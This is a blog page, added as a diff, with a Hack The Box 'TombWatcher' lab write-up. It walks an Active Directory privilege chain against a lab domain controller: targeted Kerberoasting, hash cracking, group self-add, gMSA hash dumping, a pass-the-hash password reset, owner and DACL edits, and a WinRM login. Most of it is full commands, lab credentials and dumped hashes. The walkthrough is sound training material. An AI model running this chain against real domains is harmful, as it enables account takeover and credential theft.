@@ -1,0 +1,377 @@
+<!DOCTYPE html>
+<html lang=en>
+<head>
+    <!-- so meta -->
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="HandheldFriendly" content="True">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1" />
+    <meta name="description" content="TombWatcher Domain User: henry &#x2F; H3nry_987TGV!  Attackter Kali: 10.10.16.19 Target:  10.129.62.74 信息收集： 端口扫描 1sudo nmap -sS -Pn -p1-65535 10.129.62.74    域信息收集   WriteSPN  The user HENRY@TOMBWATC">
+<meta property="og:type" content="article">
+<meta property="og:title" content="HTB-TombWatcher">
+<meta property="og:url" content="https://3inter.net/2025/06/15/HTB-TombWatcher/index.html">
+<meta property="og:site_name" content="3inter&#39;s Blog">
+<meta property="og:description" content="TombWatcher Domain User: henry &#x2F; H3nry_987TGV!  Attackter Kali: 10.10.16.19 Target:  10.129.62.74 信息收集： 端口扫描 1sudo nmap -sS -Pn -p1-65535 10.129.62.74    域信息收集   WriteSPN  The user HENRY@TOMBWATC">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://3inter.net/assets/image-20250613225625-9wfvlap.png">
+<meta property="og:image" content="https://3inter.net/assets/image-20250614235311-9mgxv4g.png">
+<meta property="og:image" content="https://3inter.net/assets/image-20250615000633-yza61g2.png">
+<meta property="og:image" content="https://3inter.net/assets/image-20250615003623-y05xlj6.png">
+<meta property="og:image" content="https://3inter.net/assets/image-20250615004055-1bdk5r8.png">
+<meta property="og:image" content="https://3inter.net/assets/image-20250615003912-ikbpf7z.png">
+<meta property="og:image" content="https://3inter.net/assets/image-20250615091226-g4gjyy2.png">
+<meta property="og:image" content="https://3inter.net/assets/image-20250615094714-0021xh0.png">
+<meta property="og:image" content="https://3inter.net/assets/image-20250615094741-7tdci28.png">
+<meta property="og:image" content="https://3inter.net/assets/image-20250615101719-9fhs31z.png">
+<meta property="og:image" content="https://3inter.net/assets/image-20250615102102-wwyetn5.png">
+<meta property="og:image" content="https://3inter.net/assets/image-20250615102130-0jvpw2q.png">
+<meta property="og:image" content="https://3inter.net/assets/image-20250615102143-49ovpyt.png">
+<meta property="article:published_time" content="2025-06-15T02:33:07.000Z">
+<meta property="article:modified_time" content="2025-06-15T02:35:10.829Z">
+<meta property="article:author" content="3inter">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://3inter.net/assets/image-20250613225625-9wfvlap.png">
+    
+    
+        
+          
+              <link rel="shortcut icon" href="/images/favicon.ico">
+          
+        
+        
+          
+            <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
+          
+        
+        
+          
+            <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
+          
+        
+    
+    <!-- title -->
+    <title>HTB-TombWatcher</title>
+    <!-- styles -->
+    
+<link rel="stylesheet" href="/lib/font-awesome/css/font-awesome.min.css">
+
+    
+<link rel="stylesheet" href="/lib/meslo-LG/styles.css">
+
+    
+<link rel="stylesheet" href="/lib/justified-gallery/justifiedGallery.min.css">
+
+    
+<link rel="stylesheet" href="/css/style.css">
+
+    <!-- rss -->
+    
+    
+    <!-- jquery -->
+    
+<script src="/lib/jquery/jquery.min.js"></script>
+
+<meta name="generator" content="Hexo 7.3.0"></head>
+
+<body>
+    <div class="banner">
+<div id="blogtitel" class="blogtitel">3inter&#39;s Blog</div>
+<ul id="wrapper" class="wrapper">
+  <div class="sun">
+    <div class="star"></div>
+  </div>
+  <div class="mercury">
+    <div class="planet">
+      <div class="shadow"></div>
+    </div>
+  </div>
+  <div class="venus">
+    <div class="planet">
+      <div class="shadow"></div>
+    </div>
+  </div>
+  <div class="earth">
+    <div class="planet"><div class="shadow"></div></div>
+  </div>
+  <div class="mars">
+    <div class="planet"><div class="shadow"></div></div>
+  </div>
+  <div class="jupiter">
+    <div class="planet"><div class="shadow"></div></div>
+  </div>
+</ul>
+</div>
+
+    <div class="background">
+      
+        <div id="header-post">
+  <a id="menu-icon" href="#"><i class="fa fa-bars fa-lg"></i></a>
+  <a id="menu-icon-tablet" href="#"><i class="fa fa-bars fa-lg"></i></a>
+  <a id="top-icon-tablet" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fa fa-chevron-up fa-lg"></i></a>
+  <span id="menu">
+    <span id="nav">
+      <ul>
+         
+          <li><a href="/home/">Home</a></li>
+         
+          <li><a href="/about/">About</a></li>
+         
+          <li><a href="/archives/">Writing</a></li>
+         
+          <li><a target="_blank" rel="noopener" href="https://github.com/Zero-winter">Projects</a></li>
+        
+      </ul>
+    </span>
+    <br/>
+    <span id="actions">
+      <ul>
+        
+        
+        <li><a class="icon" href="/2025/05/28/BOF%E6%8E%A2%E7%A9%B6%E5%AD%A6%E4%B9%A0/"><i class="fa fa-chevron-right" aria-hidden="true" onmouseover='$("#i-next").toggle();' onmouseout='$("#i-next").toggle();'></i></a></li>
+        
+        <li><a class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa fa-chevron-up" aria-hidden="true" onmouseover='$("#i-top").toggle();' onmouseout='$("#i-top").toggle();'></i></a></li>
+        <li><a class="icon" href="#"><i class="fa fa-share-alt" aria-hidden="true" onmouseover='$("#i-share").toggle();' onmouseout='$("#i-share").toggle();' onclick='$("#share").toggle();return false;'></i></a></li>
+      </ul>
+      <span id="i-prev" class="info" style="display:none;">Previous post</span>
+      <span id="i-next" class="info" style="display:none;">Next post</span>
+      <span id="i-top" class="info" style="display:none;">Back to top</span>
+      <span id="i-share" class="info" style="display:none;">Share post</span>
+    </span>
+    <br/>
+    <div id="share" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://3inter.net/2025/06/15/HTB-TombWatcher/"><i class="fa fa-facebook " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://3inter.net/2025/06/15/HTB-TombWatcher/&text=HTB-TombWatcher"><i class="fa fa-twitter " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://3inter.net/2025/06/15/HTB-TombWatcher/&title=HTB-TombWatcher"><i class="fa fa-linkedin " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://3inter.net/2025/06/15/HTB-TombWatcher/&is_video=false&description=HTB-TombWatcher"><i class="fa fa-pinterest " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=HTB-TombWatcher&body=Check out this article: https://3inter.net/2025/06/15/HTB-TombWatcher/"><i class="fa fa-envelope " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://3inter.net/2025/06/15/HTB-TombWatcher/&title=HTB-TombWatcher"><i class="fa fa-get-pocket " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://3inter.net/2025/06/15/HTB-TombWatcher/&title=HTB-TombWatcher"><i class="fa fa-reddit " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://3inter.net/2025/06/15/HTB-TombWatcher/&title=HTB-TombWatcher"><i class="fa fa-stumbleupon " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://3inter.net/2025/06/15/HTB-TombWatcher/&title=HTB-TombWatcher"><i class="fa fa-digg " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://3inter.net/2025/06/15/HTB-TombWatcher/&name=HTB-TombWatcher&description="><i class="fa fa-tumblr " aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+    <div id="toc">
+      <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#TombWatcher"><span class="toc-number">1.</span> <span class="toc-text">TombWatcher</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86%EF%BC%9A"><span class="toc-number">1.1.</span> <span class="toc-text">信息收集：</span></a></li></ol></li></ol>
+    </div>
+  </span>
+</div>
+
+      
+      <div class="content index width mx-auto px2 my4">
+          
+          <article class="post" itemscope itemtype="http://schema.org/BlogPosting">
+  <header>
+    
+    <h1 class="posttitle" itemprop="name headline">
+        HTB-TombWatcher
+    </h1>
+
+
+
+    <div class="meta">
+      <span class="author" itemprop="author" itemscope itemtype="http://schema.org/Person">
+        <span itemprop="name">3inter's Blog</span>
+      </span>
+      
+    <div class="postdate">
+        <time datetime="2025-06-15T02:33:07.000Z" itemprop="datePublished">2025-06-15</time>
+    </div>
+
+
+      
+
+    </div>
+  </header>
+  
+
+  <div class="content" itemprop="articleBody">
+    <h1 id="TombWatcher"><a href="#TombWatcher" class="headerlink" title="TombWatcher"></a>TombWatcher</h1><blockquote>
+<p>Domain User: henry &#x2F; H3nry_987TGV!</p>
+</blockquote>
+<p><strong>Attackter Kali:</strong> 10.10.16.19</p>
+<p><strong>Target:</strong>  10.129.62.74</p>
+<h2 id="信息收集："><a href="#信息收集：" class="headerlink" title="信息收集："></a>信息收集：</h2><ul>
+<li><p>端口扫描</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">sudo</span> nmap -sS -Pn -p1-65535 10.129.62.74<br></code></pre></td></tr></table></figure>
+
+<p><img src="/assets/image-20250613225625-9wfvlap.png" alt="image"></p>
+</li>
+<li><p>域信息收集</p>
+<p><img src="/assets/image-20250614235311-9mgxv4g.png" alt="image"></p>
+</li>
+<li><p>WriteSPN</p>
+<blockquote>
+<p>The user <a href="mailto:&#72;&#69;&#78;&#82;&#x59;&#x40;&#84;&#x4f;&#x4d;&#x42;&#x57;&#x41;&#x54;&#67;&#x48;&#x45;&#x52;&#x2e;&#x48;&#x54;&#x42;">HENRY@TOMBWATCHER.HTB</a> has the ability to write to the “serviceprincipalname” attribute to the user <a href="mailto:&#x41;&#76;&#70;&#82;&#x45;&#68;&#x40;&#x54;&#79;&#77;&#x42;&#87;&#65;&#x54;&#67;&#72;&#69;&#82;&#46;&#x48;&#84;&#66;">ALFRED@TOMBWATCHER.HTB</a>.</p>
+</blockquote>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">──(hello㉿world)-[~/Desktop]<br>└─$ bloodyAD -d <span class="hljs-string">&quot;tombwatcher.htb&quot;</span> --host <span class="hljs-string">&quot;10.129.62.74&quot;</span> -u <span class="hljs-string">&quot;henry&quot;</span> -p <span class="hljs-string">&quot;H3nry_987TGV\!&quot;</span> <span class="hljs-built_in">set</span> object <span class="hljs-string">&quot;ALFRED&quot;</span> servicePrincipalName -v <span class="hljs-string">&#x27;MSSQLSvc/DC01.tombwatcher.htb:1433&#x27;</span><br>[+] ALFRED<span class="hljs-string">&#x27;s servicePrincipalName has been updated</span><br></code></pre></td></tr></table></figure>
+
+<p><img src="/assets/image-20250615000633-yza61g2.png" alt="image">​</p>
+<blockquote>
+<p>同步dc ntp server</p>
+</blockquote>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">sudo</span> su <br>timedatectl set-ntp off<br><span class="hljs-built_in">date</span> -n DC01.tombwatcher.htb<br></code></pre></td></tr></table></figure>
+
+<blockquote>
+<p>获取TG</p>
+</blockquote>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs bash">└─$ nxc ldap <span class="hljs-string">&quot;10.129.29.246&quot;</span> -d <span class="hljs-string">&quot;tombwatcher.htb&quot;</span> -u <span class="hljs-string">&quot;henry&quot;</span> -p <span class="hljs-string">&quot;H3nry_987TGV\!&quot;</span> --kerberoasting kerber.txt<br>SMB         10.129.29.246   445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:tombwatcher.htb) (signing:True) (SMBv1:False)<br>LDAP        10.129.29.246   389    DC01             [+] tombwatcher.htb\henry:H3nry_987TGV! <br>LDAP        10.129.29.246   389    DC01             Bypassing disabled account krbtgt <br>LDAP        10.129.29.246   389    DC01             [*] Total of records returned 1<br>LDAP        10.129.29.246   389    DC01             sAMAccountName: Alfred memberOf:  pwdLastSet: 2025-05-12 11:17:03.526670 lastLogon:&lt;never&gt;<br>LDAP        10.129.29.246   389    DC01             $krb5tgs$23$*Alfred<span class="hljs-variable">$TOMBWATCHER</span>.HTB<span class="hljs-variable">$tombwatcher</span>.htb/Alfred*$ac650f3d514ed1df4c535af624c0332e<span class="hljs-variable">$e813a74002d71f93460ac56fffde0e5480bd170be93f9293ab21f270dc2910c97bb46cbc4e290f9e64591521e1ee31c4fb8c3ed795a756c76f44f2bf8344f902ab05460960a143eeaac8d36d31acbd00aed27e58f3f9ae1fbc3130ccdf69f2179453abf9632df2331f8a91f290cda1a80537d35f5009c50f499be88220b1d6c8979b091986ebed45fd51985ba7d613df6722382ad7d4db5cf59f484f430b95a1e55bdeac35b6644cd674d76071beb3b3a0e4c4ffb7ae8ccf8ed62acd129f0d74ea3bd517660d8ab1aca666e5fc7dcc52b1b03080092e90bd8638a0b2c72809e76b09ea647d086aa80b3e9ab84f2927810537e80abeff9baa2d2b6e4b9aa56e25bdae871bd18f1046b974ac7cf4ad3272ef0af5a1486873d23e0f1b73ef93b00151822b21090144d98dc58de2abbc5017170ea7cdf14e2087ddccc253b214d41728d2959847c631a6c61ff64c45ad3cddff6ae5596989311b482d013fbdda40a2ab07554f48725ae0390656f2927ff380ac14c184cddf1ce640b08eeecd52b9375fb2123474df4308961c7b6dabd4ee74b8bcc198c7a75074b517e0141c5904f6933a9edda6a31dab8f0f83c3e160bfc2e98247c1d42a9f689e47b7c6e6c0a38d9301d3f59009384a0e88ab97d2eba7767e1032474608c7168830032e89dc65243bc0bf1d1b488dcb433c63333f599394643096940400565d3d7f7ddee29edc47e082e2ce5edce018528f49dca353441ef8ff4fb1b3978c3915f58b90436866008eba2f271fd8dbf8fd1ceeac8ba6b10d24ae417bed877038b9e4495dcb196527e3a3d50567d02c15cc090c0b587c5f0e72433fcbdca5641f64e3733550aafd739c368323ee07ab89b4a09cd0287de48c33d54da8106333a8ec2042939ed80f1fc1e592f8a21aa7eb74b335b5c0fede52f7f4c97f04e1f1bfdc6726f3895039c6b6a76a37bccd4e9d7c5c501f85424ead716f6b2a7d571358f741e65a2ddee1941aad3fd42436032879e87fae4e9e8dcfc5eabcac6961a13f864f66a9d0884b8b52d7cd4c15c8f6d9062575976501885b6b249bd4db08cd48d3d571d664236cc7dd456100643d0ff737cd835c206942edd0b07ae08eb21917752f8bd989be0dfe2bb393a8f0dcb7e1d4ff247c7f6d0eb54f13522e26b6c49c6e27d94b2265ce1bccdb275d082d77969142f3e6cfdbc2bb0b09d36ae16feca30dab9f2160b63e51ae8affa6cfb0ac4ea107d613f10e6f8580b6df0dde0658542e144a88c34d798243a422a599c0bd40ae5dc773c3d857f7db4b7f1a7aab96c1c0c39abae23658b224bf91392e20b68ab7eb3fc4a7e5f4243f4e06fe0964a41a797a9f055542bb973ebd1ecc84680a9443441b605029c398f2ffc81aabc3c5be0919b9f37d139dd489a1080bdbc2f3db5afb26ada437d9e94da61d3cc6df46e10bce694c7372d505487c8f7346139f354e87ed5c6e1757c0a08fcb52ea</span><br><br></code></pre></td></tr></table></figure>
+
+<p><img src="/assets/image-20250615003623-y05xlj6.png" alt="image"></p>
+<blockquote>
+<p>Brute</p>
+</blockquote>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">hashcat -m 13100 spn_hash /usr/share/wordlists/rockyou.txt<br></code></pre></td></tr></table></figure>
+
+<p><img src="/assets/image-20250615004055-1bdk5r8.png" alt="image"></p>
+<p><img src="/assets/image-20250615003912-ikbpf7z.png" alt="image"></p>
+<p>获取第二个用户账户权限，用户名:<strong>Alfred</strong>    密码:<strong>basketball</strong></p>
+<blockquote>
+<p>alfred对INFRASTRUCTURE组有AddSelf权限，可以将alfred自身加入目标INFRASTRUCTURE组</p>
+</blockquote>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">└─$ bloodyAD -u <span class="hljs-string">&#x27;alfred&#x27;</span> -p <span class="hljs-string">&#x27;basketball&#x27;</span> -d tombwatcher.htb --dc-ip 10.129.29.246 add groupMember INFRASTRUCTURE alfred<br>[+] alfred added to INFRASTRUCTURE<br></code></pre></td></tr></table></figure>
+
+<p><img src="/assets/image-20250615091226-g4gjyy2.png" alt="image"></p>
+<blockquote>
+<p>INFRASTRUCTURE组对ANSIBLE_DEV 用户有readGMSAPassword权限，而刚才alfred已经加入INFRASTRUCTURE组，alfred同样对ANSIBLE_DEV 用户有readGMSAPassword权限</p>
+</blockquote>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">bloodyAD -u <span class="hljs-string">&#x27;alfred&#x27;</span> -p <span class="hljs-string">&#x27;basketball&#x27;</span> -d tombwatcher.htb --dc-ip 10.129.29.246 add groupMember INFRASTRUCTURE alfred<br></code></pre></td></tr></table></figure>
+
+<blockquote>
+<p>获取ntlm hash</p>
+</blockquote>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs bash">└─$ <span class="hljs-built_in">sudo</span> python gMSADumper.py -u <span class="hljs-string">&#x27;ALFRED&#x27;</span> -p <span class="hljs-string">&#x27;basketball&#x27;</span> -d <span class="hljs-string">&#x27;tombwatcher.htb&#x27;</span>                                         <br>Users or <span class="hljs-built_in">groups</span> <span class="hljs-built_in">who</span> can <span class="hljs-built_in">read</span> password <span class="hljs-keyword">for</span> ansible_dev$:<br> &gt; Infrastructure<br>ansible_dev$:::4b21348ca4a9edff9689cdf75cbda439<br>ansible_dev$:aes256-cts-hmac-sha1-96:499620251908efbd6972fd63ba7e385eb4ea2f0ea5127f0ab4ae3fd7811e600a<br>ansible_dev$:aes128-cts-hmac-sha1-96:230ccd9df374b5fad6a322c5d7410226<br></code></pre></td></tr></table></figure>
+
+<blockquote>
+<p>ansible_dev$机器账户，又发现其对SAM账户有<strong>ForceChangePassword</strong>权限，可以强制修改SAM的密码</p>
+</blockquote>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">└─$ pth-net rpc password <span class="hljs-string">&quot;SAM&quot;</span> <span class="hljs-string">&quot;HackTheBox&quot;</span> -U <span class="hljs-string">&quot;tombwatcher.htb&quot;</span>/<span class="hljs-string">&quot;ansible_dev$&quot;</span>%<span class="hljs-string">&quot;ffffffffffffffffffffffffffffffff&quot;</span>:<span class="hljs-string">&quot;4b21348ca4a9edff9689cdf75cbda439&quot;</span> -S <span class="hljs-string">&quot;10.129.29.246&quot;</span><br>E_md4hash wrapper called.<br>HASH PASS: Substituting user supplied NTLM HASH...<br></code></pre></td></tr></table></figure>
+
+<p><img src="/assets/image-20250615094714-0021xh0.png" alt="image"></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">└─$ netexec smb 10.129.29.246 -u sam -p HackTheBox<br>SMB         10.129.29.246   445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:tombwatcher.htb) (signing:True) (SMBv1:False)<br>SMB         10.129.29.246   445    DC01             [+] tombwatcher.htb\sam:HackTheBox <br></code></pre></td></tr></table></figure>
+
+<p><img src="/assets/image-20250615094741-7tdci28.png" alt="image"></p>
+<blockquote>
+<p>账户John的所有权改为SAM</p>
+</blockquote>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs bash">└─$ owneredit.py -action write -new-owner <span class="hljs-string">&#x27;SAM&#x27;</span> -target <span class="hljs-string">&#x27;JOHN&#x27;</span> <span class="hljs-string">&#x27;tombwatcher.htb/SAM:HackTheBox&#x27;</span><br>Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies <br><br>[*] Current owner information below<br>[*] - SID: S-1-5-21-1392491010-1358638721-2126982587-1105<br>[*] - sAMAccountName: sam<br>[*] - distinguishedName: CN=sam,CN=Users,DC=tombwatcher,DC=htb<br>[*] OwnerSid modified successfully!<br></code></pre></td></tr></table></figure>
+
+<blockquote>
+<p>获取john完全控制权限</p>
+</blockquote>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs bash">└─$ dacledit.py -action <span class="hljs-string">&#x27;write&#x27;</span> -rights <span class="hljs-string">&#x27;FullControl&#x27;</span> -principal <span class="hljs-string">&#x27;SAM&#x27;</span> -target <span class="hljs-string">&#x27;JOHN&#x27;</span> <span class="hljs-string">&#x27;tombwatcher.htb&#x27;</span>/<span class="hljs-string">&#x27;SAM&#x27;</span>:<span class="hljs-string">&#x27;HackTheBox&#x27;</span><br>Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies <br><br>[*] DACL backed up to dacledit-20250615-020523.bak<br>[*] DACL modified successfully!<br></code></pre></td></tr></table></figure>
+
+<blockquote>
+<p>修改john用户密码</p>
+</blockquote>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">└─$ net rpc password <span class="hljs-string">&quot;JOHN&quot;</span> <span class="hljs-string">&quot;HackTheBox&quot;</span> -U <span class="hljs-string">&quot;tombwatcher.htb&quot;</span>/<span class="hljs-string">&quot;SAM&quot;</span>%<span class="hljs-string">&quot;HackTheBox&quot;</span> -S 10.129.29.246<br></code></pre></td></tr></table></figure>
+
+<p><img src="/assets/image-20250615101719-9fhs31z.png" alt="image"></p>
+<blockquote>
+<p>登录</p>
+</blockquote>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">└─$ netexec smb 10.129.29.246 -u john -p HackTheBox<br>SMB         10.129.29.246   445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:tombwatcher.htb) (signing:True) (SMBv1:False)<br>SMB         10.129.29.246   445    DC01             [+] tombwatcher.htb\john:HackTheBox <br></code></pre></td></tr></table></figure>
+
+<p><img src="/assets/image-20250615102102-wwyetn5.png" alt="image"></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">evil-winrm -u john -p HackTheBox -i 10.129.29.246<br></code></pre></td></tr></table></figure>
+
+<p><img src="/assets/image-20250615102130-0jvpw2q.png" alt="image"></p>
+<p><img src="/assets/image-20250615102143-49ovpyt.png" alt="image"></p>
+</li>
+</ul>
+<p>‍</p>
+
+  </div>
+</article>
+
+
+
+      </div>
+      
+       <div id="footer-post-container">
+  <div id="footer-post">
+
+    <div id="nav-footer" style="display: none">
+      <ul>
+         
+          <li><a href="/home/">Home</a></li>
+         
+          <li><a href="/about/">About</a></li>
+         
+          <li><a href="/archives/">Writing</a></li>
+         
+          <li><a target="_blank" rel="noopener" href="https://github.com/Zero-winter">Projects</a></li>
+        
+      </ul>
+    </div>
+
+    <div id="toc-footer" style="display: none">
+      <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#TombWatcher"><span class="toc-number">1.</span> <span class="toc-text">TombWatcher</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86%EF%BC%9A"><span class="toc-number">1.1.</span> <span class="toc-text">信息收集：</span></a></li></ol></li></ol>
+    </div>
+
+    <div id="share-footer" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://3inter.net/2025/06/15/HTB-TombWatcher/"><i class="fa fa-facebook fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://3inter.net/2025/06/15/HTB-TombWatcher/&text=HTB-TombWatcher"><i class="fa fa-twitter fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://3inter.net/2025/06/15/HTB-TombWatcher/&title=HTB-TombWatcher"><i class="fa fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://3inter.net/2025/06/15/HTB-TombWatcher/&is_video=false&description=HTB-TombWatcher"><i class="fa fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=HTB-TombWatcher&body=Check out this article: https://3inter.net/2025/06/15/HTB-TombWatcher/"><i class="fa fa-envelope fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://3inter.net/2025/06/15/HTB-TombWatcher/&title=HTB-TombWatcher"><i class="fa fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://3inter.net/2025/06/15/HTB-TombWatcher/&title=HTB-TombWatcher"><i class="fa fa-reddit fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://3inter.net/2025/06/15/HTB-TombWatcher/&title=HTB-TombWatcher"><i class="fa fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://3inter.net/2025/06/15/HTB-TombWatcher/&title=HTB-TombWatcher"><i class="fa fa-digg fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://3inter.net/2025/06/15/HTB-TombWatcher/&name=HTB-TombWatcher&description="><i class="fa fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+
+    <div id="actions-footer">
+      <ul>
+        <li id="toc"><a class="icon" href="#" onclick='$("#toc-footer").toggle();return false;'><i class="fa fa-list fa-lg" aria-hidden="true"></i> TOC</a></li>
+        <li id="share"><a class="icon" href="#" onclick='$("#share-footer").toggle();return false;'><i class="fa fa-share-alt fa-lg" aria-hidden="true"></i> Share</a></li>
+        <li id="top" style="display:none"><a class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa fa-chevron-up fa-lg" aria-hidden="true"></i> Top</a></li>
+        <li id="menu"><a class="icon" href="#" onclick='$("#nav-footer").toggle();return false;'><i class="fa fa-bars fa-lg" aria-hidden="true"></i> Menu</a></li>
+      </ul>
+    </div>
+
+  </div>
+</div>
+
+      
+      <footer id="footer">
+  <div class="footer-left">
+    Copyright &copy; 2025 3inter
+  </div>
+  <div class="footer-right">
+    <nav>
+      <ul>
+         
+          <li><a href="/home/">Home</a></li>
+         
+          <li><a href="/about/">About</a></li>
+         
+          <li><a href="/archives/">Writing</a></li>
+         
+          <li><a target="_blank" rel="noopener" href="https://github.com/Zero-winter">Projects</a></li>
+        
+      </ul>
+    </nav>
+  </div>
+</footer>
+
+      
+<script src="/lib/justified-gallery/jquery.justifiedGallery.min.js"></script>
+
+
+<script src="/js/main.js"></script>
+
+<!-- Google Analytics -->
+
+<!-- Disqus Comments -->
+
+
+    </div>
+</body>
+</html>
